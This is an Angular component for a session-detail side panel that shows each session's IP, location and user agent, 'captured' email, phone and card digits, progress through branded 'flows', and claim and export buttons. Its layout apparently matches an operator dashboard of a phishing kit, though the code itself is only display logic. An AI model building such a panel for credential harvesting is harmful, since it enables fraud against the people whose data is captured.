/**
 * Session Detail Panel Component
 * Dark themed session viewer with flow branding
 */

import { Component, Input, Output, EventEmitter, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import type { FlowConfig } from '../../services/flows.service';
import { getFlowById } from '../../services/flows.service';

interface SessionData {
    id: string;
    flowId: string;
    status: 'active' | 'pending' | 'verified' | 'expired';
    ip: string;
    userAgent: string;
    location: string;
    startedAt: Date;
    data: {
        email?: string;
        phone?: string;
        cardLast4?: string;
        steps: { id: string; name: string; completedAt?: Date; data?: any }[];
    };
}

@Component({
    selector: 'app-session-detail',
    standalone: true,
    imports: [CommonModule],
    template: `
        <div class="session-panel" *ngIf="session">
            <!-- Header -->
            <div class="panel-header" [style.--brand-color]="flow?.color">
                <div class="session-identity">
                    <div class="flow-badge">
                        <span class="flow-icon">{{ flow?.icon }}</span>
                        {{ flow?.name }}
                    </div>
                    <span class="session-id">{{ session.id }}</span>
                </div>
                <div class="panel-actions">
                    <button class="action-btn" title="Claim Session">
                        <span>👤</span> Claim
                    </button>
                    <button class="action-btn danger" title="Delete">
                        <span>🗑️</span>
                    </button>
                    <button class="close-btn" (click)="onClose()">×</button>
                </div>
            </div>

            <!-- Status Bar -->
            <div class="status-bar" [class]="session.status">
                <span class="status-dot"></span>
                <span class="status-text">{{ getStatusText() }}</span>
                <span class="status-time">Started {{ getTimeAgo() }}</span>
            </div>

            <!-- Content -->
            <div class="panel-content">
                <!-- Device Info -->
                <div class="info-section">
                    <h4 class="section-title">Device Information</h4>
                    <div class="info-grid">
                        <div class="info-item">
                            <span class="info-label">IP Address</span>
                            <span class="info-value">{{ session.ip }}</span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Location</span>
                            <span class="info-value">{{ session.location }}</span>
                        </div>
                        <div class="info-item full-width">
                            <span class="info-label">User Agent</span>
                            <span class="info-value ua">{{ session.userAgent }}</span>
                        </div>
                    </div>
                </div>

                <!-- Captured Data -->
                <div class="info-section" *ngIf="hasCapturedData()">
                    <h4 class="section-title">Captured Data</h4>
                    <div class="captured-data">
                        <div class="data-item" *ngIf="session.data.email">
                            <span class="data-icon">📧</span>
                            <div class="data-content">
                                <span class="data-label">Email</span>
                                <span class="data-value">{{ session.data.email }}</span>
                            </div>
                            <button class="copy-btn" (click)="copy(session.data.email!)">📋</button>
                        </div>
                        <div class="data-item" *ngIf="session.data.phone">
                            <span class="data-icon">📱</span>
                            <div class="data-content">
                                <span class="data-label">Phone</span>
                                <span class="data-value">{{ session.data.phone }}</span>
                            </div>
                            <button class="copy-btn" (click)="copy(session.data.phone!)">📋</button>
                        </div>
                        <div class="data-item" *ngIf="session.data.cardLast4">
                            <span class="data-icon">💳</span>
                            <div class="data-content">
                                <span class="data-label">Card</span>
                                <span class="data-value">•••• {{ session.data.cardLast4 }}</span>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Steps Progress -->
                <div class="info-section">
                    <h4 class="section-title">Flow Progress</h4>
                    <div class="steps-timeline">
                        @for (step of session.data.steps; track step.id; let i = $index) {
                            <div class="step-item" [class.completed]="step.completedAt">
                                <div class="step-indicator">
                                    <span class="step-number">{{ i + 1 }}</span>
                                </div>
                                <div class="step-info">
                                    <span class="step-name">{{ step.name }}</span>
                                    <span class="step-time" *ngIf="step.completedAt">
                                        {{ formatStepTime(step.completedAt) }}
                                    </span>
                                </div>
                                <span class="step-status" [class.done]="step.completedAt">
                                    {{ step.completedAt ? '✓' : '○' }}
                                </span>
                            </div>
                        }
                    </div>
                </div>
            </div>

            <!-- Footer Actions -->
            <div class="panel-footer">
                <button class="action-btn-lg primary">
                    <span>🔗</span> View Full Details
                </button>
                <button class="action-btn-lg">
                    <span>📤</span> Export
                </button>
            </div>
        </div>
    `,
    styles: [`
        .session-panel {
            width: 400px;
            height: 100vh;
            background: var(--bg-secondary, #12121a);
            border-left: 1px solid var(--border-default, #2e2e3a);
            display: flex;
            flex-direction: column;
            position: fixed;
            right: 0;
            top: 0;
            z-index: 100;
            animation: slideIn 0.2s ease;
        }

        @keyframes slideIn {
            from { transform: translateX(100%); }
            to { transform: translateX(0); }
        }

        .panel-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 1rem 1.25rem;
            border-bottom: 1px solid var(--border-default, #2e2e3a);
            background: linear-gradient(135deg, rgba(var(--brand-color), 0.1), transparent);
        }

        .session-identity {
            display: flex;
            flex-direction: column;
            gap: 0.25rem;
        }

        .flow-badge {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            font-size: 0.875rem;
            font-weight: 600;
            color: var(--text-primary, #f8fafc);
        }

        .flow-icon {
            font-size: 1rem;
        }

        .session-id {
            font-family: monospace;
            font-size: 0.7rem;
            color: var(--text-muted, #64748b);
        }

        .panel-actions {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .action-btn {
            display: flex;
            align-items: center;
            gap: 0.375rem;
            padding: 0.375rem 0.75rem;
            font-size: 0.75rem;
            background: var(--bg-tertiary, #1a1a24);
            border: 1px solid var(--border-default, #2e2e3a);
            border-radius: 6px;
            color: var(--text-secondary, #cbd5e1);
            cursor: pointer;
        }

        .action-btn:hover {
            background: var(--bg-hover, #2a2a38);
        }

        .action-btn.danger:hover {
            background: rgba(239, 68, 68, 0.15);
            border-color: rgba(239, 68, 68, 0.3);
            color: var(--error, #ef4444);
        }

        .close-btn {
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: transparent;
            border: none;
            color: var(--text-muted, #64748b);
            font-size: 1.25rem;
            cursor: pointer;
        }

        .close-btn:hover {
            color: var(--text-primary, #f8fafc);
        }

        .status-bar {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            padding: 0.75rem 1.25rem;
            font-size: 0.8rem;
        }

        .status-bar.active { background: rgba(16, 185, 129, 0.1); }
        .status-bar.pending { background: rgba(245, 158, 11, 0.1); }
        .status-bar.verified { background: rgba(59, 130, 246, 0.1); }
        .status-bar.expired { background: rgba(239, 68, 68, 0.1); }

        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
        }

        .status-bar.active .status-dot { background: var(--success); }
        .status-bar.pending .status-dot { background: var(--warning); }
        .status-bar.verified .status-dot { background: var(--info); }
        .status-bar.expired .status-dot { background: var(--error); }

        .status-text {
            font-weight: 500;
            color: var(--text-primary, #f8fafc);
        }

        .status-time {
            margin-left: auto;
            color: var(--text-muted, #64748b);
        }

        .panel-content {
            flex: 1;
            overflow-y: auto;
            padding: 1.25rem;
        }

        .info-section {
            margin-bottom: 1.5rem;
        }

        .section-title {
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            color: var(--text-muted, #64748b);
            margin: 0 0 0.75rem;
        }

        .info-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 0.75rem;
        }

        .info-item {
            display: flex;
            flex-direction: column;
            gap: 0.25rem;
        }

        .info-item.full-width {
            grid-column: 1 / -1;
        }

        .info-label {
            font-size: 0.7rem;
            color: var(--text-muted, #64748b);
        }

        .info-value {
            font-size: 0.875rem;
            color: var(--text-primary, #f8fafc);
        }

        .info-value.ua {
            font-size: 0.75rem;
            color: var(--text-secondary, #cbd5e1);
            word-break: break-all;
        }

        .captured-data {
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
        }

        .data-item {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            padding: 0.75rem 1rem;
            background: var(--bg-tertiary, #1a1a24);
            border-radius: 8px;
        }

        .data-icon {
            font-size: 1.25rem;
        }

        .data-content {
            flex: 1;
            display: flex;
            flex-direction: column;
        }

        .data-label {
            font-size: 0.7rem;
            color: var(--text-muted, #64748b);
        }

        .data-value {
            font-size: 0.875rem;
            font-weight: 500;
            color: var(--text-primary, #f8fafc);
        }

        .copy-btn {
            padding: 0.375rem;
            background: transparent;
            border: none;
            cursor: pointer;
            opacity: 0.5;
        }

        .copy-btn:hover {
            opacity: 1;
        }

        .steps-timeline {
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
        }

        .step-item {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            padding: 0.75rem 1rem;
            background: var(--bg-tertiary, #1a1a24);
            border-radius: 8px;
            border-left: 3px solid var(--border-default, #2e2e3a);
        }

        .step-item.completed {
            border-left-color: var(--success, #10b981);
        }

        .step-indicator {
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: var(--bg-hover, #2a2a38);
            border-radius: 50%;
        }

        .step-item.completed .step-indicator {
            background: var(--success, #10b981);
        }

        .step-number {
            font-size: 0.7rem;
            font-weight: 600;
            color: var(--text-muted, #64748b);
        }

        .step-item.completed .step-number {
            color: white;
        }

        .step-info {
            flex: 1;
        }

        .step-name {
            display: block;
            font-size: 0.875rem;
            color: var(--text-primary, #f8fafc);
        }

        .step-time {
            font-size: 0.7rem;
            color: var(--text-muted, #64748b);
        }

        .step-status {
            font-size: 0.875rem;
            color: var(--text-muted, #64748b);
        }

        .step-status.done {
            color: var(--success, #10b981);
        }

        .panel-footer {
            display: flex;
            gap: 0.75rem;
            padding: 1rem 1.25rem;
            border-top: 1px solid var(--border-default, #2e2e3a);
        }

        .action-btn-lg {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            padding: 0.75rem;
            font-size: 0.875rem;
            font-weight: 500;
            background: var(--bg-tertiary, #1a1a24);
            border: 1px solid var(--border-default, #2e2e3a);
            border-radius: 8px;
            color: var(--text-secondary, #cbd5e1);
            cursor: pointer;
        }

        .action-btn-lg:hover {
            background: var(--bg-hover, #2a2a38);
        }

        .action-btn-lg.primary {
            background: var(--accent-primary, #6366f1);
            border-color: var(--accent-primary, #6366f1);
            color: white;
        }

        .action-btn-lg.primary:hover {
            background: var(--accent-primary-hover, #818cf8);
        }
    `]
})
export class SessionDetailComponent {
    @Input() session: SessionData | null = null;
    @Output() closed = new EventEmitter<void>();

    get flow(): FlowConfig | undefined {
        if (!this.session) return undefined;
        return getFlowById(this.session.flowId);
    }

    hasCapturedData(): boolean {
        if (!this.session) return false;
        const d = this.session.data;
        return !!(d.email || d.phone || d.cardLast4);
    }

    getStatusText(): string {
        const statusMap: Record<string, string> = {
            active: 'Session Active',
            pending: 'Awaiting Verification',
            verified: 'Verified',
            expired: 'Session Expired'
        };
        return statusMap[this.session?.status || ''] || 'Unknown';
    }

    getTimeAgo(): string {
        if (!this.session?.startedAt) return '';
        const diff = Date.now() - new Date(this.session.startedAt).getTime();
        const mins = Math.floor(diff / 60000);
        if (mins < 60) return `${mins}m ago`;
        const hours = Math.floor(mins / 60);
        if (hours < 24) return `${hours}h ago`;
        return `${Math.floor(hours / 24)}d ago`;
    }

    formatStepTime(date: Date): string {
        return new Date(date).toLocaleTimeString();
    }

    copy(text: string) {
        navigator.clipboard.writeText(text);
    }

    onClose() {
        this.closed.emit();
    }
}
